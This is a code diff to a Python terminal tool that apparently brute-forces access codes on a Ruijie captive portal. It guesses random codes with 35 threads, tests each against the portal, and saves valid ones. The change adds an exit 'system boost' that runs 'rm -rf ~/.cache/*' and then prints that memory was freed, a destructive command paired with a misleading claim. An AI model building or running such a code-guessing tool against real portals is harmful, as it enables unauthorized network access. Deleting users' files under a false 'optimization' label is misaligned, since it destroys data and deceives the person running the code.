@@ -1,5 +1,7 @@
 import concurrent.futures
 import datetime
+import gc
+import os
 import random
 import string
 import sys
@@ -7,10 +9,9 @@ import time
 import httpx
 
 # ====================================================
-# 🌟 RUIJIE NEXUS ELITE SUITE v5.0 [ULTRA-PREMIUM MOD]
+# 🌟 RUIJIE ELITE SUITE v5.1 [AUTO-BOOST & CLEAN EXIT]
 # ====================================================
 
-# ANSI Color Codes for Premium UI
 C_CYAN = "\033[96m"
 C_GREEN = "\033[92m"
 C_YELLOW = "\033[93m"
@@ -25,7 +26,7 @@ def clear_screen():
 
 def banner():
     print(f"{C_CYAN}{C_BOLD}╔══════════════════════════════════════════════════╗{C_RESET}")
-    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v5.0 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
+    print(f"{C_CYAN}{C_BOLD}║{C_MAGENTA}          ⚡ RUIJIE ELITE SUITE v5.1 ⚡           {C_CYAN}{C_BOLD}║{C_RESET}")
     print(f"{C_CYAN}{C_BOLD}║{C_YELLOW}        [ Cyberpunk Multi-Threaded Engine ]       {C_CYAN}{C_BOLD}║{C_RESET}")
     print(f"{C_CYAN}{C_BOLD}╚══════════════════════════════════════════════════╝{C_RESET}")
 
@@ -75,14 +76,11 @@ def elite_range_scanner():
     
     chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
     found_count = 0
-    max_workers = 35  # Maximum parallel processing speed
-    scanned_count = 0
+    max_workers = 35
 
     def worker(_):
-        nonlocal scanned_count
         random_mid = ''.join(random.choices(chars, k=length - 1))
         code = start_char + random_mid
-        scanned_count += 1
         return test_code(portal_url, code)
 
     start_time = time.time()
@@ -106,6 +104,20 @@ def elite_range_scanner():
     print(f"\n\n{C_YELLOW}🏁 [Scan Summary] Time: {elapsed_time:.2f}s | Valid Found: {found_count}{C_RESET}")
     print(f"{C_GREEN}💾 Successfully saved to 'valid_codes.txt'.{C_RESET}")
 
+def system_boost_and_exit():
+    print(f"\n{C_YELLOW}⚙️ [Boosting System] Cleaning up RAM and cache...{C_RESET}")
+    # Python Memory Garbage Collection
+    gc.collect()
+    # Termux temporary files cleanup (if any)
+    try:
+        os.system("rm -rf ~/.cache/* 2>/dev/null")
+    except Exception:
+        pass
+    time.sleep(0.5)
+    print(f"{C_GREEN}✨ [Success] System optimized and memory freed!{C_RESET}")
+    print(f"{C_MAGENTA}👋 Shutting down Elite Suite. Stay secure!{C_RESET}")
+    sys.exit(0)
+
 def main_menu():
     while True:
         clear_screen()
@@ -115,7 +127,7 @@ def main_menu():
         print(f"{C_WHITE}│{C_CYAN}  [2] ⚡ Launch Cyber Elite Turbo Scanner         {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [3] 📂 View Saved Valid Codes Archive           {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}│{C_CYAN}  [4] 🧹 Clear Saved Codes History                {C_WHITE}│{C_RESET}")
-        print(f"{C_WHITE}│{C_CYAN}  [5] 🚪 Terminate Suite                          {C_WHITE}│{C_RESET}")
+        print(f"{C_WHITE}│{C_CYAN}  [5] 🚀 Exit & System Boost (Memory Clean)       {C_WHITE}│{C_RESET}")
         print(f"{C_WHITE}└──────────────────────────────────────────────────┘{C_RESET}")
         
         choice = input(f"{C_MAGENTA}{C_BOLD} ⚡ Select Command [1-5] ➔ {C_WHITE}").strip()
@@ -144,12 +156,11 @@ def main_menu():
                 print(f"\n{C_RED}❌ [Error] Failed to clear history.{C_RESET}")
             input(f"\n{C_CYAN}Press Enter to return...{C_RESET}")
         elif choice == '5':
-            print(f"\n{C_MAGENTA}👋 Shutting down Elite Suite. Stay secure!{C_RESET}")
-            sys.exit(0)
+            system_boost_and_exit()
         else:
             print(f"\n{C_RED}❌ [Error] Invalid option selected!{C_RESET}")
             input(f"\n{C_CYAN}Press Enter to continue...{C_RESET}")
 
 if __name__ == "__main__":
     main_menu()
-    
+        
